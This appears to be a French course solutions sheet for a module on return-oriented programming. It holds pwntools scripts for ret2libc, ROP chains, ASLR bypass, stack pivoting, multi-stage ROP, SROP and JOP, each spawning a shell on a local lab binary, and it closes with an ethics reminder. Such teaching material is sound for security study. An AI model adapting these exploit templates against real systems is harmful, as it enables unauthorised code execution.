═══════════════════════════════════════════════════════════════════
SOLUTIONS - Module 38 : ROP Chains
═══════════════════════════════════════════════════════════════════

SOLUTION 1 : ROPgadget Finder
═══════════════════════════════════════════════════════════════════

Utiliser les outils existants :

ROPgadget --binary vuln --ropchain

ropper --file vuln --search "pop rdi"

# Python avec capstone
import capstone

md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
# Désassembler et chercher patterns

═══════════════════════════════════════════════════════════════════
SOLUTION 2 : ret2libc Exploit
═══════════════════════════════════════════════════════════════════

from pwn import *

# Programme vulnérable
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Adresses
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))
pop_rdi = 0x400683  # Trouver avec ROPgadget

# Payload
payload = b'A' * 72  # Padding jusqu'à saved RIP
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p = process('./vuln')
p.sendline(payload)
p.interactive()

═══════════════════════════════════════════════════════════════════
SOLUTION 3 : ROP Chain Builder (pwntools)
═══════════════════════════════════════════════════════════════════

from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# Construire chaîne execve("/bin/sh", NULL, NULL)
binsh = next(elf.search(b'/bin/sh'))

rop.call('execve', [binsh, 0, 0])

payload = b'A' * 72 + rop.chain()

p = process('./vuln')
p.sendline(payload)
p.interactive()

═══════════════════════════════════════════════════════════════════
SOLUTION 4 : ASLR Bypass via Info Leak
═══════════════════════════════════════════════════════════════════

from pwn import *

p = process('./vuln')

# Stage 1 : Leak d'adresse
p.recvuntil(b'Address: ')
leak = int(p.recvline().strip(), 16)

# Calculer base de libc (dépend de l'offset connu)
libc_base = leak - 0x21b97  # Offset connu de la fonction fuie
system = libc_base + 0x4f440

# Stage 2 : ROP avec adresses absolues
payload = b'A' * 72
payload += p64(pop_rdi)
payload += p64(leak + 0x1000)  # "/bin/sh" dans libc
payload += p64(system)

p.sendline(payload)
p.interactive()

═══════════════════════════════════════════════════════════════════
SOLUTION 5 : Stack Pivoting
═══════════════════════════════════════════════════════════════════

from pwn import *

# Préparer ROP chain dans zone BSS contrôlée
bss_addr = 0x601000
xchg_rsp_rax = 0x400700

# Écrire ROP chain en BSS via vulnérabilité
# (dépend du binaire spécifique)

# Pivoter
payload = b'A' * 72
payload += p64(pop_rax)
payload += p64(bss_addr)
payload += p64(xchg_rsp_rax)

# RSP pointe maintenant vers bss_addr où se trouve notre ROP chain

═══════════════════════════════════════════════════════════════════
SOLUTION 6 : Multi-Stage ROP
═══════════════════════════════════════════════════════════════════

from pwn import *

p = process('./vuln')

# Stage 1 : Appeler read(0, bss_addr, 1000)
stage1 = b'A' * 72
stage1 += p64(pop_rdi) + p64(0)      # stdin
stage1 += p64(pop_rsi) + p64(bss_addr)
stage1 += p64(pop_rdx) + p64(1000)
stage1 += p64(read_addr)
stage1 += p64(pivot_to_bss)

p.sendline(stage1)

# Stage 2 : ROP chain complète via read()
stage2 = p64(pop_rdi) + p64(binsh)
stage2 += p64(system)

p.sendline(stage2)
p.interactive()

═══════════════════════════════════════════════════════════════════
SOLUTION 7 : SROP (Sigreturn-Oriented Programming)
═══════════════════════════════════════════════════════════════════

from pwn import *

p = process('./vuln')

# Construire sigreturn frame
frame = SigreturnFrame()
frame.rax = 59       # execve
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

# Payload
payload = b'A' * 72
payload += p64(pop_rax) + p64(15)  # rt_sigreturn
payload += p64(syscall_addr)
payload += bytes(frame)

p.sendline(payload)
p.interactive()

═══════════════════════════════════════════════════════════════════
SOLUTION 8 : JOP (Jump-Oriented Programming)
═══════════════════════════════════════════════════════════════════

# Gadgets JOP
jmp_rax = 0x400650

# Dispatcher : contrôle RAX puis jmp rax
dispatcher = 0x400660  # mov rax, [rsp]; add rsp, 8; jmp rax

# JOP chain (différent de ROP)
jop_chain = [
    dispatcher,
    gadget1_addr,
    data1,
    gadget2_addr,
    data2,
    # ...
]

═══════════════════════════════════════════════════════════════════
RESSOURCES SUPPLÉMENTAIRES
═══════════════════════════════════════════════════════════════════

TUTORIELS :
- ROPEmporium : https://ropemporium.com
- LiveOverflow : YouTube channel
- Nightmare : https://guyinatuxedo.github.io

OUTILS :
- pwntools : pip install pwntools
- ROPgadget : pip install ROPgadget
- one_gadget : gem install one_gadget

CHALLENGES :
- pwnable.kr
- pwnable.tw
- exploit.education
- HackTheBox

LIVRES :
- "The Shellcoder's Handbook"
- "Hacking: The Art of Exploitation"
- "A Guide to Kernel Exploitation"

═══════════════════════════════════════════════════════════════════
RAPPEL FINAL
═══════════════════════════════════════════════════════════════════

ROP est une compétence offensive avancée.

UTILISER UNIQUEMENT POUR :
✓ Apprentissage sur CTF et challenges
✓ Améliorer la sécurité défensive
✓ Pentest autorisé contractuellement
✓ Recherche académique éthique

JAMAIS POUR :
✗ Exploitation de systèmes sans autorisation
✗ Développement de malware
✗ Activités illégales

Vous êtes responsable de vos actions.

═══════════════════════════════════════════════════════════════════
